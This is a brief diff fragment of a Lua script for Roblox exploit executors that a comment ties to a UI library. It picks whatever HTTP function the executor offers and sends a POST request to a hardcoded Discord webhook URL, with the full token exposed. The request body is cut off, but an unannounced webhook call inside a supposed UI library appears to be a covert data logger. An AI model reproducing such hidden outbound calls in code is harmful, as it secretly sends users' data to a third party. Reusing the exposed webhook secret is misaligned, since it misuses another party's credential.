@@ -1,6 +1,6 @@
 --https://raw.githubusercontent.com/Stebulous/solaris-ui-lib/main/source.lua
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-local response = httprequest({
+httprequest({
   Url = 'https://discord.com/api/webhooks/1060220426250362890/zJ14Dqk4SdwNVLftKieyO3ZYB7TefgFpx2yPqcBTQiZqlG0a-4fqvFmKiMpdHzt_vqL0',
   Method = "POST",
   Headers = {
